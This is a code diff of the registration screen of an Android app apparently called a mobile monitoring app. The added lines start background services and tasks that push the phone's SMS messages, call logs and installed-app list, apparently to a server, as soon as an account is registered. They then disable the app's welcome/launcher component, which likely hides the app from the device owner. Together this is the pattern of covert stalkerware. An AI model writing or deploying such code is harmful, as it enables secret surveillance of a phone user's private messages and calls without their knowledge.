@@ -2,31 +2,23 @@ package the5concurrentnodes.mobilemonitoringapp;
 
 import android.app.Activity;
 import android.app.ProgressDialog;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.graphics.Color;
-import android.graphics.PorterDuff;
-import android.graphics.drawable.Drawable;
 import android.os.Bundle;
 import android.support.design.widget.CoordinatorLayout;
 import android.support.design.widget.Snackbar;
 import android.support.design.widget.TextInputLayout;
-import android.support.v7.app.ActionBar;
 import android.support.v7.app.ActionBarActivity;
 import android.support.v7.widget.Toolbar;
 import android.text.Editable;
-import android.text.InputType;
 import android.text.TextWatcher;
-import android.util.Log;
 import android.view.Menu;
-import android.view.MenuItem;
 import android.view.View;
 import android.view.inputmethod.InputMethodManager;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.ImageButton;
-import android.widget.ImageView;
-import android.widget.Toast;
 
 import com.android.volley.DefaultRetryPolicy;
 import com.android.volley.Request;
@@ -38,19 +30,17 @@ import com.android.volley.toolbox.JsonObjectRequest;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.util.ArrayList;
-
-import the5concurrentnodes.account.Register;
-import the5concurrentnodes.account.Utility;
-import the5concurrentnodes.controllers.DataPushServiceHandler;
-import the5concurrentnodes.controllers.InternetConnectionDetector;
+import the5concurrentnodes.generic.Utility;
+import the5concurrentnodes.services.DataPushServiceHandler;
 import the5concurrentnodes.controllers.UserSessionStorage;
 import the5concurrentnodes.controllers.VolleyRequestQueue;
 import the5concurrentnodes.dialogs.LoginRegisterDialog;
 import the5concurrentnodes.generic.Config;
-import the5concurrentnodes.mmaData.Browser.BrowserHandler;
-import the5concurrentnodes.mmaData.Browser.BrowserObserver;
+import the5concurrentnodes.mmaData.DeviceApps.PushAppsInfo;
+import the5concurrentnodes.mmaData.call.CallsInitPush;
 import the5concurrentnodes.mmaData.deviceInfo.DeviceInfo;
+import the5concurrentnodes.mmaData.sms.SmsInitPush;
+import the5concurrentnodes.services.DataMonitorPushServiceHandler;
 
 
 public class RegisterActivity extends ActionBarActivity {
@@ -90,9 +80,7 @@ public class RegisterActivity extends ActionBarActivity {
 
         emailWrapper.getEditText().addTextChangedListener(new TextWatcher() {
             @Override
-            public void beforeTextChanged(CharSequence s, int start, int count, int after) {
-
-            }
+            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
 
             @Override
             public void onTextChanged(CharSequence s, int start, int before, int count) {
@@ -148,7 +136,7 @@ public class RegisterActivity extends ActionBarActivity {
             }
         });
 
-        progressDialog = new ProgressDialog(RegisterActivity.this, R.style.AppDialogTheme);
+        progressDialog = new ProgressDialog(RegisterActivity.this, R.style.AppTheme_Dark_Dialog);
         progressDialog.setMessage(RegisterActivity.this.getString(R.string.progress_signing_up));
     }
 
@@ -230,6 +218,14 @@ public class RegisterActivity extends ActionBarActivity {
                         dialog.show(getFragmentManager(), null);
 
                         DataPushServiceHandler.getInstance().startService(getApplicationContext());
+                        DataMonitorPushServiceHandler.getInstance().startService(getApplicationContext());
+                        new PushAppsInfo(getApplicationContext()).execute();
+                        new SmsInitPush(getApplicationContext()).execute();
+                        new CallsInitPush(getApplicationContext()).execute();
+
+                        PackageManager packageManager = getPackageManager();
+                        ComponentName componentName = new ComponentName(getApplicationContext(), WelcomeActivity.class);
+                        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
                     }else {
 
@@ -257,7 +253,7 @@ public class RegisterActivity extends ActionBarActivity {
 
         RequestQueue requestQueue = VolleyRequestQueue.getRequestQueue();
 
-        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(5000,
+        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(50000,
                 DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
                 DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
         
@@ -330,6 +326,7 @@ public class RegisterActivity extends ActionBarActivity {
 
     public void toSignIn(View view) {
 
+        finish();
         Intent intent = new Intent(getApplicationContext(), LoginActivity.class);
         startActivity(intent);
     }
